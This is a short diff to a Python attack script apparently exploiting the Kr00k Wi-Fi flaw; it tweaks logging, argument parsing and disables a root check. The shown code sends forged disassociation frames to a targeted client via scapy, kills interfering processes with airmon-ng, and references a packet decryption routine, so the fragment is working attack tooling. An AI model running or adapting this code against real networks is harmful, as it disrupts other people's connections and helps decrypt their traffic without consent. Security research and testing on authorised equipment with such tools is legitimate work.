@@ -39,9 +39,9 @@ class KR00K:
                 addr3=self.ap_mac.lower()) / Dot11Disas()
             sendp(pkt, iface=self.interface, count=count, verbose=False)
             
-            self.SUCCESS(str(count),
-                        ' disassociation packets sent to: ', client,
-                        ' from: ', bssid )
+            self.SUCCESS(str(count)+
+                        ' disassociation packets sent to: '+ self.sta_mac+
+                        ' from: '+ self.ap_mac )
             time.sleep(3)
 
     def decrypt(self, pkt):
@@ -112,9 +112,8 @@ class KR00K:
 def main():
 
     try:
-        parser = argparse.ArgumentParser(add_help=False)
+        parser = argparse.ArgumentParser()
 
-        parser.add_argument('-h', '--help'        , dest="help"     , default=False, action="store_true")
         parser.add_argument('-i', '--interface'   , dest="interface", default=None, type=str)
         parser.add_argument('-t', '--target'      , dest="victim"   , default=None, type=str) # if not specified passive listen to all
         parser.add_argument('-v', '--verbose'     , dest="verbose"  , default=True, type=bool)
@@ -127,9 +126,9 @@ def main():
 
 
         kr00k = KR00K(options)
-        if os.getuid() != 0:
-            kr00k.ERROR("please run as root")
-            exit(0)
+    #    if os.getuid() != 0:
+     #       kr00k.ERROR("please run as root")
+      #      exit(0)
         kr00k.INFO("killing processes that could cause trouble. (airmon-ng check kill)")
         run(['airmon-ng check kill'], shell=True, stdout=PIPE)
         # interface_mode: CompletedProcess = run(['iwconfig ' + options.interface], shell=True, stdout=PIPE)
